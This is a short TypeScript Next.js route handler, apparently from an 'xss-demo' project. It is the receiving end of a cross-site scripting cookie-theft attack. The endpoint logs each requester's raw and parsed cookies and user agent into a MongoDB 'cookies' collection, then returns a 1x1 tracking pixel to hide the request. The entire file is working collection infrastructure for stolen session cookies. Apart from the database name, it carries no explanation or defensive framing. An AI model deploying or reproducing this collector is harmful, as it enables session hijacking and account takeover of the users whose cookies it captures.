import clientPromise from "../../../../lib/mongodb";

function parseCookie(cookieStr: string | null) {
  if (!cookieStr) return {};

  return Object.fromEntries(
    cookieStr.split(";").map((c) => {
      const [key, ...v] = c.trim().split("=");
      return [key, v.join("=")];
    })
  );
}

export async function GET(req: Request) {
  try {
    const cookieHeader = req.headers.get("cookie");

    const cookiesJson = parseCookie(cookieHeader);

    const client = await clientPromise;
    const db = client.db("xss-demo");

    await db.collection("cookies").insertOne({
      time: new Date(),
      cookieRaw: cookieHeader, // 👈 giữ raw nếu cần debug
      cookie: cookiesJson,     // 👈 JSON
      userAgent: req.headers.get("user-agent"),
    });

    // pixel 1x1
    const pixel = Buffer.from(
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=",
      "base64"
    );

    return new Response(pixel, {
      headers: {
        "Content-Type": "image/png",
      },
    });
  } catch (err) {
    console.error(err);
    return new Response(null, { status: 500 });
  }
}